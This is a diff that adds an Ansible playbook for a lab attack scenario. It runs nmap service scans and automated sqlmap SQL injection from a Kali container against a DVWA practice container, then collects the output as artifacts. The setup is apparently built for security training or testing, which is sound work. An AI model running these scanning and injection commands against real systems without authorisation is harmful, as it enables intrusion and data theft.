@@ -1,0 +1,24 @@
+- name: Run attack scenario: Recon + SQLi
+  hosts: local
+  gather_facts: false
+  vars:
+    target_host: dvwa
+    target_url: "http://dvwa"
+  tasks:
+    - name: Run nmap from Kali against DVWA
+      command: podman exec kali nmap -sC -sV dvwa -oX /tmp/nmap_dvwa.xml
+      register: nmap_run
+      failed_when: false
+
+    - name: Copy nmap result to host
+      command: podman cp kali:/tmp/nmap_dvwa.xml {{ playbook_dir }}/../artifacts/nmap_dvwa.xml
+      failed_when: false
+
+    - name: Run sqlmap against a DVWA endpoint (non-interactive)
+      command: podman exec kali sqlmap -u "{{ target_url }}/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --output-dir=/tmp/sqlmap_out
+      register: sqlmap_run
+      failed_when: false
+
+    - name: Copy sqlmap output to host
+      command: podman cp kali:/tmp/sqlmap_out {{ playbook_dir }}/../artifacts/sqlmap_out || true
+      failed_when: false
